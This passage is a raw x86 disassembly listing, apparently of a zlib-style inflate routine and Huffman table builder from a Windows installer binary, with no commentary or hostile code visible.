  4064fe:	0f b6 08             	movzbl (%eax),%ecx
  406501:	f6 c1 10             	test   $0x10,%cl
  406504:	74 18                	je     0x40651e
  406506:	83 e1 0f             	and    $0xf,%ecx
  406509:	89 4e 08             	mov    %ecx,0x8(%esi)
  40650c:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  406510:	89 46 0c             	mov    %eax,0xc(%esi)
  406513:	c7 06 04 00 00 00    	movl   $0x4,(%esi)
  406519:	e9 6b 02 00 00       	jmp    0x406789
  40651e:	f6 c1 40             	test   $0x40,%cl
  406521:	0f 85 05 f9 ff ff    	jne    0x405e2c
  406527:	89 4e 0c             	mov    %ecx,0xc(%esi)
  40652a:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  40652e:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  406531:	89 46 08             	mov    %eax,0x8(%esi)
  406534:	e9 50 02 00 00       	jmp    0x406789
  406539:	8b 46 08             	mov    0x8(%esi),%eax
  40653c:	eb 20                	jmp    0x40655e
  40653e:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406542:	0f 84 51 02 00 00    	je     0x406799
  406548:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40654b:	ff 4d cc             	decl   -0x34(%ebp)
  40654e:	0f b6 11             	movzbl (%ecx),%edx
  406551:	8b cb                	mov    %ebx,%ecx
  406553:	d3 e2                	shl    %cl,%edx
  406555:	09 55 c0             	or     %edx,-0x40(%ebp)
  406558:	ff 45 c8             	incl   -0x38(%ebp)
  40655b:	83 c3 08             	add    $0x8,%ebx
  40655e:	3b d8                	cmp    %eax,%ebx
  406560:	72 dc                	jb     0x40653e
  406562:	0f b7 0c 45 b0 93 40 	movzwl 0x4093b0(,%eax,2),%ecx
  406569:	00 
  40656a:	23 4d c0             	and    -0x40(%ebp),%ecx
  40656d:	01 4e 0c             	add    %ecx,0xc(%esi)
  406570:	8b c8                	mov    %eax,%ecx
  406572:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406575:	2b d8                	sub    %eax,%ebx
  406577:	c7 06 05 00 00 00    	movl   $0x5,(%esi)
  40657d:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406580:	8b 56 0c             	mov    0xc(%esi),%edx
  406583:	8b c8                	mov    %eax,%ecx
  406585:	2b ce                	sub    %esi,%ecx
  406587:	81 e9 a0 1b 00 00    	sub    $0x1ba0,%ecx
  40658d:	3b ca                	cmp    %edx,%ecx
  40658f:	73 13                	jae    0x4065a4
  406591:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  406597:	2b ca                	sub    %edx,%ecx
  406599:	2b ce                	sub    %esi,%ecx
  40659b:	8d 8c 01 60 e4 ff ff 	lea    -0x1ba0(%ecx,%eax,1),%ecx
  4065a2:	eb 04                	jmp    0x4065a8
  4065a4:	8b c8                	mov    %eax,%ecx
  4065a6:	2b ca                	sub    %edx,%ecx
  4065a8:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  4065ac:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4065af:	0f 84 90 f9 ff ff    	je     0x405f45
  4065b5:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  4065b8:	85 ff                	test   %edi,%edi
  4065ba:	0f 85 91 00 00 00    	jne    0x406651
  4065c0:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  4065c6:	3b c7                	cmp    %edi,%eax
  4065c8:	75 23                	jne    0x4065ed
  4065ca:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  4065d0:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  4065d6:	3b ca                	cmp    %edx,%ecx
  4065d8:	74 13                	je     0x4065ed
  4065da:	8b c2                	mov    %edx,%eax
  4065dc:	3b c1                	cmp    %ecx,%eax
  4065de:	73 07                	jae    0x4065e7
  4065e0:	2b c8                	sub    %eax,%ecx
  4065e2:	49                   	dec    %ecx
  4065e3:	8b f9                	mov    %ecx,%edi
  4065e5:	eb 02                	jmp    0x4065e9
  4065e7:	2b f8                	sub    %eax,%edi
  4065e9:	85 ff                	test   %edi,%edi
  4065eb:	75 64                	jne    0x406651
  4065ed:	ff 75 08             	push   0x8(%ebp)
  4065f0:	89 86 a8 9b 00 00    	mov    %eax,0x9ba8(%esi)
  4065f6:	e8 09 02 00 00       	call   0x406804
  4065fb:	8b 86 a8 9b 00 00    	mov    0x9ba8(%esi),%eax
  406601:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  406607:	3b c1                	cmp    %ecx,%eax
  406609:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40660c:	73 07                	jae    0x406615
  40660e:	8b f9                	mov    %ecx,%edi
  406610:	2b f8                	sub    %eax,%edi
  406612:	4f                   	dec    %edi
  406613:	eb 08                	jmp    0x40661d
  406615:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  40661b:	2b f8                	sub    %eax,%edi
  40661d:	8b 96 a0 9b 00 00    	mov    0x9ba0(%esi),%edx
  406623:	3b c2                	cmp    %edx,%eax
  406625:	89 55 f8             	mov    %edx,-0x8(%ebp)
  406628:	75 1f                	jne    0x406649
  40662a:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  406630:	3b ca                	cmp    %edx,%ecx
  406632:	74 15                	je     0x406649
  406634:	8b c2                	mov    %edx,%eax
  406636:	3b c1                	cmp    %ecx,%eax
  406638:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40663b:	73 07                	jae    0x406644
  40663d:	2b c8                	sub    %eax,%ecx
  40663f:	49                   	dec    %ecx
  406640:	8b f9                	mov    %ecx,%edi
  406642:	eb 05                	jmp    0x406649
  406644:	8b 7d f8             	mov    -0x8(%ebp),%edi
  406647:	2b f8                	sub    %eax,%edi
  406649:	85 ff                	test   %edi,%edi
  40664b:	0f 84 64 01 00 00    	je     0x4067b5
  406651:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406654:	8a 11                	mov    (%ecx),%dl
  406656:	88 10                	mov    %dl,(%eax)
  406658:	40                   	inc    %eax
  406659:	41                   	inc    %ecx
  40665a:	4f                   	dec    %edi
  40665b:	3b 8e a0 9b 00 00    	cmp    0x9ba0(%esi),%ecx
  406661:	89 45 d0             	mov    %eax,-0x30(%ebp)
  406664:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  406667:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  40666a:	75 09                	jne    0x406675
  40666c:	8d 8e a0 1b 00 00    	lea    0x1ba0(%esi),%ecx
  406672:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  406675:	ff 4e 04             	decl   0x4(%esi)
  406678:	0f 85 3a ff ff ff    	jne    0x4065b8
  40667e:	e9 c2 f8 ff ff       	jmp    0x405f45
  406683:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406686:	8b 7d d0             	mov    -0x30(%ebp),%edi
  406689:	85 c0                	test   %eax,%eax
  40668b:	0f 85 91 00 00 00    	jne    0x406722
  406691:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  406697:	3b f9                	cmp    %ecx,%edi
  406699:	75 23                	jne    0x4066be
  40669b:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  4066a1:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  4066a7:	3b c2                	cmp    %edx,%eax
  4066a9:	74 13                	je     0x4066be
  4066ab:	8b fa                	mov    %edx,%edi
  4066ad:	3b f8                	cmp    %eax,%edi
  4066af:	73 05                	jae    0x4066b6
  4066b1:	2b c7                	sub    %edi,%eax
  4066b3:	48                   	dec    %eax
  4066b4:	eb 04                	jmp    0x4066ba
  4066b6:	2b cf                	sub    %edi,%ecx
  4066b8:	8b c1                	mov    %ecx,%eax
  4066ba:	85 c0                	test   %eax,%eax
  4066bc:	75 64                	jne    0x406722
  4066be:	ff 75 08             	push   0x8(%ebp)
  4066c1:	89 be a8 9b 00 00    	mov    %edi,0x9ba8(%esi)
  4066c7:	e8 38 01 00 00       	call   0x406804
  4066cc:	8b be a8 9b 00 00    	mov    0x9ba8(%esi),%edi
  4066d2:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  4066d8:	3b f9                	cmp    %ecx,%edi
  4066da:	89 7d d0             	mov    %edi,-0x30(%ebp)
  4066dd:	73 07                	jae    0x4066e6
  4066df:	8b c1                	mov    %ecx,%eax
  4066e1:	2b c7                	sub    %edi,%eax
  4066e3:	48                   	dec    %eax
  4066e4:	eb 08                	jmp    0x4066ee
  4066e6:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  4066ec:	2b c7                	sub    %edi,%eax
  4066ee:	8b 96 a0 9b 00 00    	mov    0x9ba0(%esi),%edx
  4066f4:	3b fa                	cmp    %edx,%edi
  4066f6:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4066f9:	75 1f                	jne    0x40671a
  4066fb:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  406701:	3b ca                	cmp    %edx,%ecx
  406703:	74 15                	je     0x40671a
  406705:	8b fa                	mov    %edx,%edi
  406707:	3b f9                	cmp    %ecx,%edi
  406709:	89 7d d0             	mov    %edi,-0x30(%ebp)
  40670c:	73 07                	jae    0x406715
  40670e:	2b cf                	sub    %edi,%ecx
  406710:	49                   	dec    %ecx
  406711:	8b c1                	mov    %ecx,%eax
  406713:	eb 05                	jmp    0x40671a
  406715:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406718:	2b c7                	sub    %edi,%eax
  40671a:	85 c0                	test   %eax,%eax
  40671c:	0f 84 93 00 00 00    	je     0x4067b5
  406722:	8a 4e 08             	mov    0x8(%esi),%cl
  406725:	88 0f                	mov    %cl,(%edi)
  406727:	47                   	inc    %edi
  406728:	48                   	dec    %eax
  406729:	89 7d d0             	mov    %edi,-0x30(%ebp)
  40672c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40672f:	e9 11 f8 ff ff       	jmp    0x405f45
  406734:	83 fb 07             	cmp    $0x7,%ebx
  406737:	76 09                	jbe    0x406742
  406739:	83 eb 08             	sub    $0x8,%ebx
  40673c:	ff 45 cc             	incl   -0x34(%ebp)
  40673f:	ff 4d c8             	decl   -0x38(%ebp)
  406742:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406745:	ff 75 08             	push   0x8(%ebp)
  406748:	89 86 a8 9b 00 00    	mov    %eax,0x9ba8(%esi)
  40674e:	e8 b1 00 00 00       	call   0x406804
  406753:	8b 8e a8 9b 00 00    	mov    0x9ba8(%esi),%ecx
  406759:	8b 96 a4 9b 00 00    	mov    0x9ba4(%esi),%edx
  40675f:	3b ca                	cmp    %edx,%ecx
  406761:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  406764:	73 07                	jae    0x40676d
  406766:	8b c2                	mov    %edx,%eax
  406768:	2b c1                	sub    %ecx,%eax
  40676a:	48                   	dec    %eax
  40676b:	eb 08                	jmp    0x406775
  40676d:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  406773:	2b c1                	sub    %ecx,%eax
  406775:	3b ca                	cmp    %edx,%ecx
  406777:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40677a:	75 39                	jne    0x4067b5
  40677c:	8b 86 14 05 00 00    	mov    0x514(%esi),%eax
  406782:	83 f8 08             	cmp    $0x8,%eax
  406785:	89 06                	mov    %eax,(%esi)
  406787:	75 33                	jne    0x4067bc
  406789:	8b 06                	mov    (%esi),%eax
  40678b:	83 f8 0f             	cmp    $0xf,%eax
  40678e:	0f 86 32 f6 ff ff    	jbe    0x405dc6
  406794:	e9 93 f6 ff ff       	jmp    0x405e2c
  406799:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40679c:	33 ff                	xor    %edi,%edi
  40679e:	89 86 1c 05 00 00    	mov    %eax,0x51c(%esi)
  4067a4:	8b 45 08             	mov    0x8(%ebp),%eax
  4067a7:	89 9e 18 05 00 00    	mov    %ebx,0x518(%esi)
  4067ad:	89 78 04             	mov    %edi,0x4(%eax)
  4067b0:	e9 98 f6 ff ff       	jmp    0x405e4d
  4067b5:	33 ff                	xor    %edi,%edi
  4067b7:	e9 79 f6 ff ff       	jmp    0x405e35
  4067bc:	33 ff                	xor    %edi,%edi
  4067be:	47                   	inc    %edi
  4067bf:	e9 71 f6 ff ff       	jmp    0x405e35
  4067c4:	c1 63 40 00          	shll   $0x0,0x40(%ebx)
  4067c8:	d4 63                	aam    $0x63
  4067ca:	40                   	inc    %eax
  4067cb:	00 6a 64             	add    %ch,0x64(%edx)
  4067ce:	40                   	inc    %eax
  4067cf:	00 bb 64 40 00 39    	add    %bh,0x39004064(%ebx)
  4067d5:	65 40                	gs inc %eax
  4067d7:	00 7d 65             	add    %bh,0x65(%ebp)
  4067da:	40                   	inc    %eax
  4067db:	00 83 66 40 00 34    	add    %al,0x34004066(%ebx)
  4067e1:	67 40                	addr16 inc %eax
  4067e3:	00 ed                	add    %ch,%ch
  4067e5:	5d                   	pop    %ebp
  4067e6:	40                   	inc    %eax
  4067e7:	00 82 5f 40 00 a7    	add    %al,-0x58ffbfa1(%edx)
  4067ed:	5f                   	pop    %edi
  4067ee:	40                   	inc    %eax
  4067ef:	00 b5 60 40 00 f4    	add    %dh,-0xbffbfa0(%ebp)
  4067f5:	60                   	pusha
  4067f6:	40                   	inc    %eax
  4067f7:	00 d7                	add    %dl,%bh
  4067f9:	62 40 00             	bound  %eax,0x0(%eax)
  4067fc:	2c 5e                	sub    $0x5e,%al
  4067fe:	40                   	inc    %eax
  4067ff:	00 42 67             	add    %al,0x67(%edx)
  406802:	40                   	inc    %eax
  406803:	00 53 56             	add    %dl,0x56(%ebx)
  406806:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40680a:	57                   	push   %edi
  40680b:	8b be b4 9b 00 00    	mov    0x9bb4(%esi),%edi
  406811:	8b 9e b8 9b 00 00    	mov    0x9bb8(%esi),%ebx
  406817:	3b fb                	cmp    %ebx,%edi
  406819:	76 06                	jbe    0x406821
  40681b:	8b 9e b0 9b 00 00    	mov    0x9bb0(%esi),%ebx
  406821:	8b 46 0c             	mov    0xc(%esi),%eax
  406824:	2b df                	sub    %edi,%ebx
  406826:	3b d8                	cmp    %eax,%ebx
  406828:	72 02                	jb     0x40682c
  40682a:	8b d8                	mov    %eax,%ebx
  40682c:	53                   	push   %ebx
  40682d:	57                   	push   %edi
  40682e:	ff 76 08             	push   0x8(%esi)
  406831:	2b c3                	sub    %ebx,%eax
  406833:	89 46 0c             	mov    %eax,0xc(%esi)
  406836:	e8 06 ee ff ff       	call   0x405641
  40683b:	01 5e 08             	add    %ebx,0x8(%esi)
  40683e:	8b 86 b0 9b 00 00    	mov    0x9bb0(%esi),%eax
  406844:	03 fb                	add    %ebx,%edi
  406846:	3b f8                	cmp    %eax,%edi
  406848:	75 16                	jne    0x406860
  40684a:	39 86 b8 9b 00 00    	cmp    %eax,0x9bb8(%esi)
  406850:	8d be b0 1b 00 00    	lea    0x1bb0(%esi),%edi
  406856:	75 b9                	jne    0x406811
  406858:	89 be b8 9b 00 00    	mov    %edi,0x9bb8(%esi)
  40685e:	eb b1                	jmp    0x406811
  406860:	89 be b4 9b 00 00    	mov    %edi,0x9bb4(%esi)
  406866:	5f                   	pop    %edi
  406867:	5e                   	pop    %esi
  406868:	5b                   	pop    %ebx
  406869:	c2 04 00             	ret    $0x4
  40686c:	55                   	push   %ebp
  40686d:	8b ec                	mov    %esp,%ebp
  40686f:	81 ec ec 00 00 00    	sub    $0xec,%esp
  406875:	53                   	push   %ebx
  406876:	56                   	push   %esi
  406877:	8b 75 0c             	mov    0xc(%ebp),%esi
  40687a:	57                   	push   %edi
  40687b:	6a 10                	push   $0x10
  40687d:	33 c0                	xor    %eax,%eax
  40687f:	59                   	pop    %ecx
  406880:	8d 7d 90             	lea    -0x70(%ebp),%edi
  406883:	f3 ab                	rep stos %eax,%es:(%edi)
  406885:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406888:	8b d6                	mov    %esi,%edx
  40688a:	8b 01                	mov    (%ecx),%eax
  40688c:	83 c1 04             	add    $0x4,%ecx
  40688f:	8d 44 85 90          	lea    -0x70(%ebp,%eax,4),%eax
  406893:	ff 00                	incl   (%eax)
  406895:	4a                   	dec    %edx
  406896:	75 f2                	jne    0x40688a
  406898:	39 75 90             	cmp    %esi,-0x70(%ebp)
  40689b:	75 13                	jne    0x4068b0
  40689d:	8b 45 1c             	mov    0x1c(%ebp),%eax
  4068a0:	83 20 00             	andl   $0x0,(%eax)
  4068a3:	8b 45 20             	mov    0x20(%ebp),%eax
  4068a6:	83 20 00             	andl   $0x0,(%eax)
  4068a9:	33 c0                	xor    %eax,%eax
  4068ab:	e9 f0 02 00 00       	jmp    0x406ba0
  4068b0:	8b 75 20             	mov    0x20(%ebp),%esi
  4068b3:	33 db                	xor    %ebx,%ebx
  4068b5:	43                   	inc    %ebx
  4068b6:	6a 0f                	push   $0xf
  4068b8:	8b 3e                	mov    (%esi),%edi
  4068ba:	8b cb                	mov    %ebx,%ecx
  4068bc:	89 7d 20             	mov    %edi,0x20(%ebp)
  4068bf:	5a                   	pop    %edx
  4068c0:	33 c0                	xor    %eax,%eax
  4068c2:	39 44 8d 90          	cmp    %eax,-0x70(%ebp,%ecx,4)
  4068c6:	75 05                	jne    0x4068cd
  4068c8:	41                   	inc    %ecx
  4068c9:	3b ca                	cmp    %edx,%ecx
  4068cb:	76 f3                	jbe    0x4068c0
  4068cd:	3b f9                	cmp    %ecx,%edi
  4068cf:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4068d2:	73 03                	jae    0x4068d7
  4068d4:	89 4d 20             	mov    %ecx,0x20(%ebp)
  4068d7:	39 44 95 90          	cmp    %eax,-0x70(%ebp,%edx,4)
  4068db:	75 03                	jne    0x4068e0
  4068dd:	4a                   	dec    %edx
  4068de:	75 f7                	jne    0x4068d7
  4068e0:	39 55 20             	cmp    %edx,0x20(%ebp)
  4068e3:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4068e6:	76 03                	jbe    0x4068eb
  4068e8:	89 55 20             	mov    %edx,0x20(%ebp)
  4068eb:	8b 7d 20             	mov    0x20(%ebp),%edi
  4068ee:	89 3e                	mov    %edi,(%esi)
  4068f0:	d3 e3                	shl    %cl,%ebx
  4068f2:	eb 0d                	jmp    0x406901
  4068f4:	2b 5c 8d 90          	sub    -0x70(%ebp,%ecx,4),%ebx
  4068f8:	0f 88 9f 02 00 00    	js     0x406b9d
  4068fe:	41                   	inc    %ecx
  4068ff:	03 db                	add    %ebx,%ebx
  406901:	3b ca                	cmp    %edx,%ecx
  406903:	72 ef                	jb     0x4068f4
  406905:	8b f2                	mov    %edx,%esi
  406907:	c1 e6 02             	shl    $0x2,%esi
  40690a:	8d 4c 35 90          	lea    -0x70(%ebp,%esi,1),%ecx
  40690e:	8b 39                	mov    (%ecx),%edi
  406910:	2b df                	sub    %edi,%ebx
  406912:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  406915:	0f 88 82 02 00 00    	js     0x406b9d
  40691b:	03 fb                	add    %ebx,%edi
  40691d:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  406923:	89 39                	mov    %edi,(%ecx)
  406925:	33 c9                	xor    %ecx,%ecx
  406927:	4a                   	dec    %edx
  406928:	74 13                	je     0x40693d
  40692a:	33 ff                	xor    %edi,%edi
  40692c:	03 4c 3d 94          	add    -0x6c(%ebp,%edi,1),%ecx
  406930:	83 c7 04             	add    $0x4,%edi
  406933:	4a                   	dec    %edx
  406934:	89 8c 3d 54 ff ff ff 	mov    %ecx,-0xac(%ebp,%edi,1)
  40693b:	75 ef                	jne    0x40692c
  40693d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406940:	33 ff                	xor    %edi,%edi
  406942:	8b 0b                	mov    (%ebx),%ecx
  406944:	83 c3 04             	add    $0x4,%ebx
  406947:	3b c8                	cmp    %eax,%ecx
  406949:	74 13                	je     0x40695e
  40694b:	8d 8c 8d 50 ff ff ff 	lea    -0xb0(%ebp,%ecx,4),%ecx
  406952:	8b 11                	mov    (%ecx),%edx
  406954:	89 3c 95 a0 d2 42 00 	mov    %edi,0x42d2a0(,%edx,4)
  40695b:	42                   	inc    %edx
  40695c:	89 11                	mov    %edx,(%ecx)
  40695e:	47                   	inc    %edi
  40695f:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  406962:	72 de                	jb     0x406942
  406964:	8b 8c 35 50 ff ff ff 	mov    -0xb0(%ebp,%esi,1),%ecx
  40696b:	8b 5d 20             	mov    0x20(%ebp),%ebx
  40696e:	83 4d f4 ff          	orl    $0xffffffff,-0xc(%ebp)
  406972:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  406976:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  406979:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40697c:	f7 db                	neg    %ebx
  40697e:	3b 4d e8             	cmp    -0x18(%ebp),%ecx
  406981:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406984:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40698a:	c7 45 e0 a0 d2 42 00 	movl   $0x42d2a0,-0x20(%ebp)
  406991:	89 85 14 ff ff ff    	mov    %eax,-0xec(%ebp)
  406997:	0f 8f f3 01 00 00    	jg     0x406b90
  40699d:	8d 51 ff             	lea    -0x1(%ecx),%edx
  4069a0:	8d 4c 8d 90          	lea    -0x70(%ebp,%ecx,4),%ecx
  4069a4:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4069a7:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4069aa:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4069ad:	8b 31                	mov    (%ecx),%esi
  4069af:	85 f6                	test   %esi,%esi
  4069b1:	0f 84 c3 01 00 00    	je     0x406b7a
  4069b7:	eb 03                	jmp    0x4069bc
  4069b9:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  4069bc:	8b 4d 20             	mov    0x20(%ebp),%ecx
  4069bf:	4e                   	dec    %esi
  4069c0:	03 cb                	add    %ebx,%ecx
  4069c2:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  4069c5:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  4069c8:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4069cb:	0f 8e cc 00 00 00    	jle    0x406a9d
  4069d1:	46                   	inc    %esi
  4069d2:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4069d5:	8b 75 e8             	mov    -0x18(%ebp),%esi
  4069d8:	ff 45 f4             	incl   -0xc(%ebp)
  4069db:	2b 75 ec             	sub    -0x14(%ebp),%esi
  4069de:	3b 75 20             	cmp    0x20(%ebp),%esi
  4069e1:	76 03                	jbe    0x4069e6
  4069e3:	8b 75 20             	mov    0x20(%ebp),%esi
  4069e6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4069e9:	33 d2                	xor    %edx,%edx
  4069eb:	2b 4d ec             	sub    -0x14(%ebp),%ecx
  4069ee:	42                   	inc    %edx
  4069ef:	d3 e2                	shl    %cl,%edx
  4069f1:	3b 55 f0             	cmp    -0x10(%ebp),%edx
  4069f4:	76 23                	jbe    0x406a19
  4069f6:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  4069f9:	83 c8 ff             	or     $0xffffffff,%eax
  4069fc:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  4069ff:	03 d0                	add    %eax,%edx
  406a01:	3b ce                	cmp    %esi,%ecx
  406a03:	73 14                	jae    0x406a19
  406a05:	eb 0d                	jmp    0x406a14
  406a07:	83 c7 04             	add    $0x4,%edi
  406a0a:	03 d2                	add    %edx,%edx
  406a0c:	8b 07                	mov    (%edi),%eax
  406a0e:	3b d0                	cmp    %eax,%edx
  406a10:	76 07                	jbe    0x406a19
  406a12:	2b d0                	sub    %eax,%edx
  406a14:	41                   	inc    %ecx
  406a15:	3b ce                	cmp    %esi,%ecx
  406a17:	72 ee                	jb     0x406a07
  406a19:	8b 55 28             	mov    0x28(%ebp),%edx
  406a1c:	33 c0                	xor    %eax,%eax
  406a1e:	40                   	inc    %eax
  406a1f:	8b 12                	mov    (%edx),%edx
  406a21:	d3 e0                	shl    %cl,%eax
  406a23:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406a26:	8d 3c 02             	lea    (%edx,%eax,1),%edi
  406a29:	81 ff a0 05 00 00    	cmp    $0x5a0,%edi
  406a2f:	0f 87 68 01 00 00    	ja     0x406b9d
  406a35:	8b 45 24             	mov    0x24(%ebp),%eax
  406a38:	8d 04 90             	lea    (%eax,%edx,4),%eax
  406a3b:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406a3e:	8d b4 95 14 ff ff ff 	lea    -0xec(%ebp,%edx,4),%esi
  406a45:	8b 55 28             	mov    0x28(%ebp),%edx
  406a48:	89 3a                	mov    %edi,(%edx)
  406a4a:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406a4d:	85 d2                	test   %edx,%edx
  406a4f:	89 06                	mov    %eax,(%esi)
  406a51:	74 31                	je     0x406a84
  406a53:	8b 7d f8             	mov    -0x8(%ebp),%edi
  406a56:	8b 76 fc             	mov    -0x4(%esi),%esi
  406a59:	89 bc 95 50 ff ff ff 	mov    %edi,-0xb0(%ebp,%edx,4)
  406a60:	8a 55 20             	mov    0x20(%ebp),%dl
  406a63:	88 55 09             	mov    %dl,0x9(%ebp)
  406a66:	88 4d 08             	mov    %cl,0x8(%ebp)
  406a69:	8b d7                	mov    %edi,%edx
  406a6b:	8b cb                	mov    %ebx,%ecx
  406a6d:	d3 ea                	shr    %cl,%edx
  406a6f:	8b c8                	mov    %eax,%ecx
  406a71:	2b ce                	sub    %esi,%ecx
  406a73:	c1 f9 02             	sar    $0x2,%ecx
  406a76:	2b ca                	sub    %edx,%ecx
  406a78:	66 89 4d 0a          	mov    %cx,0xa(%ebp)
  406a7c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406a7f:	89 0c 96             	mov    %ecx,(%esi,%edx,4)
  406a82:	eb 05                	jmp    0x406a89
  406a84:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  406a87:	89 01                	mov    %eax,(%ecx)
  406a89:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406a8c:	8b d9                	mov    %ecx,%ebx
  406a8e:	03 4d 20             	add    0x20(%ebp),%ecx
  406a91:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  406a94:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  406a97:	0f 8f 38 ff ff ff    	jg     0x4069d5
  406a9d:	8a 4d fc             	mov    -0x4(%ebp),%cl
  406aa0:	8b 75 e0             	mov    -0x20(%ebp),%esi
  406aa3:	2a cb                	sub    %bl,%cl
  406aa5:	88 4d 09             	mov    %cl,0x9(%ebp)
  406aa8:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406aab:	8d 0c 8d a0 d2 42 00 	lea    0x42d2a0(,%ecx,4),%ecx
  406ab2:	3b f1                	cmp    %ecx,%esi
  406ab4:	72 06                	jb     0x406abc
  406ab6:	c6 45 08 c0          	movb   $0xc0,0x8(%ebp)
  406aba:	eb 43                	jmp    0x406aff
  406abc:	8b 0e                	mov    (%esi),%ecx
  406abe:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  406ac1:	73 1c                	jae    0x406adf
  406ac3:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406ac9:	0f 92 c1             	setb   %cl
  406acc:	fe c9                	dec    %cl
  406ace:	83 e1 60             	and    $0x60,%ecx
  406ad1:	88 4d 08             	mov    %cl,0x8(%ebp)
  406ad4:	66 8b 0e             	mov    (%esi),%cx
  406ad7:	83 c6 04             	add    $0x4,%esi
  406ada:	89 75 e0             	mov    %esi,-0x20(%ebp)
  406add:	eb 1c                	jmp    0x406afb
  406adf:	2b 4d 10             	sub    0x10(%ebp),%ecx
  406ae2:	8b 55 18             	mov    0x18(%ebp),%edx
  406ae5:	03 c9                	add    %ecx,%ecx
  406ae7:	8a 14 11             	mov    (%ecx,%edx,1),%dl
  406aea:	80 c2 50             	add    $0x50,%dl
  406aed:	83 45 e0 04          	addl   $0x4,-0x20(%ebp)
  406af1:	88 55 08             	mov    %dl,0x8(%ebp)
  406af4:	8b 55 14             	mov    0x14(%ebp),%edx
  406af7:	66 8b 0c 11          	mov    (%ecx,%edx,1),%cx
  406afb:	66 89 4d 0a          	mov    %cx,0xa(%ebp)
  406aff:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406b02:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406b05:	33 ff                	xor    %edi,%edi
  406b07:	2b cb                	sub    %ebx,%ecx
  406b09:	47                   	inc    %edi
  406b0a:	8b f7                	mov    %edi,%esi
  406b0c:	d3 e6                	shl    %cl,%esi
  406b0e:	8b cb                	mov    %ebx,%ecx
  406b10:	d3 ea                	shr    %cl,%edx
  406b12:	eb 08                	jmp    0x406b1c
  406b14:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406b17:	89 0c 90             	mov    %ecx,(%eax,%edx,4)
  406b1a:	03 d6                	add    %esi,%edx
  406b1c:	3b 55 dc             	cmp    -0x24(%ebp),%edx
  406b1f:	72 f3                	jb     0x406b14
  406b21:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  406b24:	8b 75 f8             	mov    -0x8(%ebp),%esi
  406b27:	8b d7                	mov    %edi,%edx
  406b29:	d3 e2                	shl    %cl,%edx
  406b2b:	eb 04                	jmp    0x406b31
  406b2d:	33 f2                	xor    %edx,%esi
  406b2f:	d1 ea                	shr    $1,%edx
  406b31:	85 d6                	test   %edx,%esi
  406b33:	75 f8                	jne    0x406b2d
